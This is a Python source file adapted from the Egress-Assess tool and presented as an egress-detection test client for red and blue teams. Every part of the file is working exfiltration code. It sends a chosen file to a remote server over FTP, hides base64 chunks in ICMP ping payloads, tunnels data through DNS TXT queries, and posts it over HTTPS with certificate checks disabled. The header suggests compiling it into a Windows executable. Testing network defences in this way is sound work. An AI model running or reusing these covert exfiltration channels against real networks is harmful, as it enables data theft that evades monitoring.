#!/usr/bin/env python

# Disclaimer
# Directly adapted from FortyNorthSecurity's Egress-Assess
# to test Exfiltration in Windows Systems.
# Only some of the Client components are preserved
# and thus, this can only as as client.
# On the server side, just use the original script.
# Use pyinstaller to convert this into EXE for testing.

# This tool is designed to be an easy way to test exfiltrating data
# from the network you are currently plugged into.  Used for red or
# blue teams that want to test network boundary egress detection
# capabilities.

import logging
import socket
import sys
from common import helpers

# FTP Client
import os
from ftplib import FTP
from ftplib import error_perm

# ICMP Client
import base64
import re
from scapy.all import *

# DNS Client
import struct

# HTTPS Client
import ssl
import urllib2

class FTP_Client:

    def __init__(self, cli_object):
        self.protocol = "ftp"
        self.remote_server = cli_object.ip
        self.username = cli_object.username
        self.password = cli_object.password
        if cli_object.client_port is None:
            self.port = 21
        else:
            self.port = cli_object.client_port
        if cli_object.file is None:
            self.file_transfer = False
        else:
            if "/" in cli_object.file:
                self.file_name = cli_object.file.split("/")[-1]
                self.file_transfer = cli_object.file
            else:
                self.file_transfer = cli_object.file

    def transmit(self, data_to_transmit):

        try:
            ftp = FTP()
            ftp.connect(self.remote_server, self.port)
        except socket.gaierror:
            print "[*] Error: Cannot connect to FTP server.  Checking provided ip!"
            sys.exit()

        try:
            ftp.login(self.username, self.password)
        except error_perm:
            print "[*] Error: Username or password is incorrect!  Please re-run."
            sys.exit()

        if self.file_transfer:
            ftp.storbinary("STOR " + self.file_name, open(self.file_transfer, "rb"))

        ftp.quit()
        print "[*] File sent!!!"

class ICMP_Client:

    def __init__(self, cli_object):
        self.protocol = "icmp"
        self.length = 1050   # Number of cleartext characters allowed before b64 encoded
        self.remote_server = cli_object.ip
        if cli_object.file is None:
            self.file_transfer = False
        else:
            if "/" in cli_object.file:
                self.file_transfer = cli_object.file.split("/")[-1]
            else:
                self.file_transfer = cli_object.file

    def transmit(self, data_to_transmit):

        byte_reader = 0
        packet_number = 1

        # Determine if sending via IP or domain name
        if helpers.validate_ip(self.remote_server):
            final_destination = self.remote_server
        else:
            print "[*] Resolving IP of domain..."
            final_destination = socket.gethostbyname(self.remote_server)

        # calcalate total packets
        if ((len(data_to_transmit) % self.length) == 0):
            total_packets = len(data_to_transmit) / self.length
        else:
            total_packets = (len(data_to_transmit) / self.length) + 1
        self.current_total = total_packets

        while (byte_reader < len(data_to_transmit)):
            if not self.file_transfer:
                encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
            else:
                encoded_data = base64.b64encode(self.file_transfer +
                    ".:::-989-:::." + data_to_transmit[byte_reader:byte_reader + self.length])

            print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)

            # Craft the packet with scapy
            try:
                send(IP(dst=final_destination)/ICMP()/(encoded_data), verbose=False)
            except KeyboardInterrupt:
                print "[*] Shutting down..."
                sys.exit()

            # Increment counters
            byte_reader += self.length
            packet_number += 1

        return
class DNS_Client:

    def __init__(self, cli_object):
        self.protocol = "dns"
        self.remote_server = cli_object.ip
        self.max_length = 63
        self.current_total = 0
        if cli_object.file is None:
            self.file_transfer = False
            self.length = 35
        else:
            self.length = 35
            if "/" in cli_object.file:
                self.file_transfer = cli_object.file.split("/")[-1]
            else:
                self.file_transfer = cli_object.file

    def transmit(self, data_to_transmit):

        byte_reader = 0
        check_total = False
        packet_number = 1

        # Determine if sending via IP or domain name
        if helpers.validate_ip(self.remote_server):
            final_destination = self.remote_server
        else:
            print "[*] Resolving IP of domain..."
            final_destination = socket.gethostbyname(self.remote_server)

        # calcalate total packets
        if ((len(data_to_transmit) % self.length) == 0):
            total_packets = len(data_to_transmit) / self.length
        else:
            total_packets = (len(data_to_transmit) / self.length) + 1
        self.current_total = total_packets

        # While loop over the file or data to send
        while (byte_reader < len(data_to_transmit)):
            if not self.file_transfer:
                try:
                    encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
                    send(IP(dst=final_destination)/UDP()/DNS(
                           id=15, opcode=0, qd=[DNSQR(
                            qname=encoded_data, qtype="TXT")], aa=1, qr=0),
                         verbose=False)
                    print "Sending data...        " + str(packet_number) + "/" + str(total_packets)
                    packet_number += 1
                    byte_reader += self.length

                except KeyboardInterrupt:
                    print "[*] Shutting down..."
                    sys.exit()
            else:
                encoded_data = base64.b64encode(str(struct.pack('>I', packet_number)) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])

                while len(encoded_data) > self.max_length:

                    self.length -= 1
                    # calcalate total packets
                    if (((len(data_to_transmit) - byte_reader) % self.length) == 0):
                        packet_diff = (len(data_to_transmit) - byte_reader) / self.length
                    else:
                        packet_diff = ((len(data_to_transmit) - byte_reader) / self.length)
                    check_total = True
                    encoded_data = base64.b64encode(str(struct.pack('>I',packet_number)) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])

                if check_total:
                    self.current_total = packet_number + packet_diff
                    check_total = False

                print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(self.current_total)

                # Craft the packet with scapy
                try:
                    while True:
                        response_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
                            id=15, opcode=0,
                            qd=[DNSQR(qname=encoded_data, qtype="TXT")], aa=1, qr=0),
                            verbose=False, timeout=2)
                        break
                        '''
                        if response_packet:
                            if response_packet.haslayer(DNSRR):
                                dnsrr_strings = repr(response_packet[DNSRR])
                                if str(packet_number) + "allgoodhere" in dnsrr_strings:
                                    break
                        '''

                except KeyboardInterrupt:
                    print "[*] Shutting down..."
                    sys.exit()

            # Increment counters
            byte_reader += self.length
            packet_number += 1

        if self.file_transfer is not False:
            while True:
                final_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
                    id=15, opcode=0,
                    qd=[DNSQR(qname="ENDTHISFILETRANSMISSIONEGRESSASSESS" + self.file_transfer, qtype="TXT")], aa=1, qr=0),
                    verbose=True, timeout=2)
                break
                '''
                if final_packet:
                    break
                '''
        return

class HTTPS_Client:

    def __init__(self, cli_object):
        self.data_to_transmit = ''
        self.remote_server = cli_object.ip
        self.protocol = "https"
        if cli_object.client_port is None:
            self.port = 443
        else:
            self.port = cli_object.client_port
        if cli_object.file is None:
            self.file_transfer = False
        else:
            if "/" in cli_object.file:
                self.file_transfer = cli_object.file.split("/")[-1]
            else:
                self.file_transfer = cli_object.file

    def transmit(self, data_to_transmit):

        ssl._create_default_https_context = ssl._create_unverified_context
        if not self.file_transfer:
            url = "https://" + self.remote_server + ":" + str(self.port) + "/post_data.php"

            # Post the data to the web server at the specified URL
            try:
                f = urllib2.urlopen(url, data_to_transmit)
                f.close()
                print "[*] File sent!!!"
            except urllib2.URLError:
                print "[*] Error: Web server may not be active on " + self.remote_server
                print "[*] Error: Please check server to make sure it is active!"
                sys.exit()
        else:
            url = "https://" + self.remote_server + ":" + str(self.port) + "/post_file.php"

            try:
                data_to_transmit = self.file_transfer + ".:::-989-:::." + data_to_transmit
                f = urllib2.urlopen(url, data_to_transmit)
                f.close()
                print "[*] File sent!!!"
            except urllib2.URLError:
                print "[*] Error: Web server may not be active on " + self.remote_server
                print "[*] Error: Please check server to make sure it is active!"
                sys.exit()

        return

if __name__ == "__main__":

    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    helpers.title_screen()

    cli_parsed = helpers.cli_parser()

    if cli_parsed.client is not None:
        # load up all supported client protocols and datatypes
        if cli_parsed.file is None:
            print "Please specify a file to exfiltrate !!"
            sys.exit()
        else:
            with open(cli_parsed.file, 'rb') as file_data_handle:
                file_data = file_data_handle.read()
            
            if cli_parsed.client.lower() == 'ftp':
                proto_module = FTP_Client(cli_parsed)
                proto_module.transmit(file_data)
                helpers.class_info()
                sys.exit()
            elif cli_parsed.client.lower() == 'icmp':
                proto_module = ICMP_Client(cli_parsed)
                proto_module.transmit(file_data)
                helpers.class_info()
                sys.exit()
            elif cli_parsed.client.lower() == 'dns':
                proto_module = DNS_Client(cli_parsed)
                proto_module.transmit(file_data)
                helpers.class_info()
                sys.exit()
            elif cli_parsed.client.lower() == 'https':
                proto_module = HTTPS_Client(cli_parsed)
                proto_module.transmit(file_data)
                helpers.class_info()
                sys.exit()

        helpers.class_info()
        print "[*] Error: You either didn't provide a valid datatype or client protocol to use."
        print "[*] Error: Re-run and use --list-datatypes or --list-clients to see possible options."
        sys.exit()
